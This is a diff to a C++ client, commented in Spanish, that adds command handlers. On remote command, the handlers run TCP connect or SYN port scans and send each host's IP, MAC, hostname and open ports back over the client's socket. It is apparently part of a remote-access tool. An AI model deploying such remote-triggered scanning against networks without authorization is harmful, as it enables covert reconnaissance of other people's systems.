@@ -901,7 +901,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
-    //Escanear red
+    //Escanear red PING
     if (iComando == EnumComandos::Net_Scan) {
         if (!this->mod_Scan) {
             this->mod_Scan = new mod_Escaner();
@@ -915,6 +915,26 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, nullptr, EnumComandos::Net_Scan);
         return;
     }
+
+    //Escaner red puertos (SCK) - TCP completo (SYN)_ requiere admin
+    if (iComando == EnumComandos::Net_Scan_Sck || iComando == EnumComandos::Net_Scan_Syn ||
+        iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) {
+        if (!this->mod_Scan) {
+            this->mod_Scan = new mod_Escaner();
+        }
+        bool isFullScan = (iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) ? true : false;
+        int iTipoEscaner = iComando == EnumComandos::Net_Scan_Sck ? TipoEscanerPuerto::SCK : TipoEscanerPuerto::SYN;
+
+        std::string strPaquete = "";
+        for (Host_Entry& host : this->mod_Scan->m_Escanear(paquete.cBuffer.data(), isFullScan, true, iTipoEscaner)) {
+            strPaquete += host.strip + "|" + host.strmac + "|" + host.strhostname + "|" + host.strports + "<||>";
+        }
+        strPaquete = strPaquete.substr(0, strPaquete.size() - 4);
+
+        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, nullptr, iComando);
+        return;
+    }
+    
 }
 
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
